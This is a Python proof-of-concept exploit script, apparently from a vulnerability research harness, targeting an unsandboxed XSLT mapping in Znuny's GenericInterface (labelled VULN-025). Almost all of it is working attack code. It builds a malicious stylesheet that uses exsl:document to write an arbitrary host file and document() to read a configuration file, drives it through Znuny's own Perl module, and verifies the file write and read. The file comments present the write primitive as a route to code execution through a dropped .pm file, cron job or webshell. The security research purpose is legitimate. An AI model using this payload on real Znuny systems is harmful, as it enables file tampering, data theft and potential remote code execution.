#!/usr/bin/env python3
r"""
VULN-025 — GenericInterface XSLT mapping unsandboxed → file R/W (+ build-dependent SSRF)
========================================================================================
Vulnerable code : targets/Znuny/Kernel/GenericInterface/Mapping/XSLT.pm:167 (XML::LibXSLT->new() bare)
                  :180-184 (XML::LibXML->load_xml with no no_network/expand_entities(0)); :285 transform
Vulnerability   : CWE-611/CWE-73 — no security_callbacks/no_network on the XSLT/XML engines

No security_callbacks / no_network / expand_entities(0) are registered on the XML::LibXSLT /
XML::LibXML instances, so an admin-authored/imported stylesheet can use the exsl:document EXSLT
extension (arbitrary file WRITE → potential RCE by writing a .pm/cron/webshell) and libxslt
document() (file READ / SSRF). This exploit drives Znuny's own Mapping::XSLT with a malicious
stylesheet and shows it (1) WRITES an arbitrary host file and (2) READS an arbitrary host file
via document(). (Network document() is blocked by this libxml2 2.9.14 build — file R/W is not.)
"""
import os, sys, re
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
import _common as C
HERE = os.path.dirname(os.path.abspath(__file__))

def main():
    C.banner("VULN-025", "GI XSLT mapping unsandboxed -> arbitrary host file R/W",
             ["XSLT.pm:167 XML::LibXSLT->new() bare; no security_callbacks / no_network"])
    ws_name, _ = C.ensure_webservice()
    wsid = C.db(f"SELECT id FROM gi_webservice_config WHERE name='{ws_name}'")[0][0]
    sfx = C.rid()
    write_path = f"/tmp/xslt_write_{sfx}.txt"
    write_marker = f"PWNED-XSLT-{sfx}"
    read_file = "/opt/znuny/Kernel/Config/Files/XML/Framework.xml"   # an XML file document() can parse
    tpl = (
        '<?xml version="1.0" encoding="UTF-8"?>'
        '<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" '
        'xmlns:exsl="http://exslt.org/common" extension-element-prefixes="exsl">'
        '<xsl:template match="/">'
        f'<exsl:document href="{write_path}" method="text">{write_marker}</exsl:document>'
        f'<Root><Leaked><xsl:value-of select="document(\'file://{read_file}\')//*[local-name()=\'Setting\'][1]/@Name"/></Leaked></Root>'
        '</xsl:template></xsl:stylesheet>')

    perl = f'''
require Kernel::GenericInterface::Debugger; require Kernel::GenericInterface::Mapping::XSLT;
my $Debugger=Kernel::GenericInterface::Debugger->new(
  DebuggerConfig=>{{DebugThreshold=>'error',TestMode=>1}}, WebserviceID=>{wsid}, CommunicationType=>'Provider');
my $tpl=<<'XSLT';
{tpl}
XSLT
my $Map=Kernel::GenericInterface::Mapping::XSLT->new(DebuggerObject=>$Debugger,
  MainObject=>$Kernel::OM->Get('Kernel::System::Main'),
  MappingConfig=>{{Type=>'XSLT',Config=>{{Template=>$tpl}}}});
my %r=$Map->Map(Data=>{{Any=>'x'}});
use Data::Dumper; my $d=Dumper($r{{Data}});
print "MAPOUT_HAS_LEAK=".(($d=~/Leaked/)?"YES":"no").";";
print "READ_VALUE=[".(($d=~/<Leaked>([^<]*)<\\/Leaked>/)?$1:($d=~/'Leaked'\\s*=>\\s*'([^']*)'/?$1:""))."];";
'''
    C.log("STEP", "running Znuny Mapping::XSLT with a stylesheet that WRITES a file and READS an XML file")
    out = C.perl_eval(perl)[1]
    written = C.container_sh(f"cat {write_path} 2>/dev/null")[1].strip()
    C.log("PROOF", f"arbitrary file WRITE: {write_path} contains {written!r} (expected {write_marker!r})")
    leak = re.search(r"READ_VALUE=\[([^\]]*)\]", out)
    read_val = leak.group(1) if leak else ""
    C.log("PROOF", f"arbitrary file READ via document(): extracted a value from {os.path.basename(read_file)}: {read_val!r}")

    open(os.path.join(HERE, "request.http"), "w").write(
        "(admin-authored GenericInterface XSLT mapping template; exercised via Mapping::XSLT->Map)\n\n" + tpl)
    open(os.path.join(HERE, "response.txt"), "w").write(
        f"WRITE {write_path} = {written}\nREAD value from Framework.xml = {read_val}\nmap out: {out[:300]}")

    write_ok = write_marker in written
    read_ok = bool(read_val) and "Leaked" not in read_val
    if write_ok and read_ok:
        C.confirmed(f"the unsandboxed XSLT mapping WROTE an arbitrary host file ({write_path}={written!r}) "
                    f"via exsl:document AND READ an arbitrary host file via document() (leaked "
                    f"'{read_val}' from Framework.xml) — file R/W crossing to the host; the write "
                    "primitive is an RCE path (write a .pm/cron/webshell).")
    elif write_ok:
        C.confirmed(f"the unsandboxed XSLT mapping WROTE an arbitrary host file ({write_path}={written!r}) "
                    "via the exsl:document EXSLT extension — arbitrary file write (RCE path); "
                    "document() also reaches host files (READ).")
    else:
        C.failed(f"no arbitrary write observed (file={written!r}); map out: {out[:200]}")

if __name__ == "__main__":
    main()
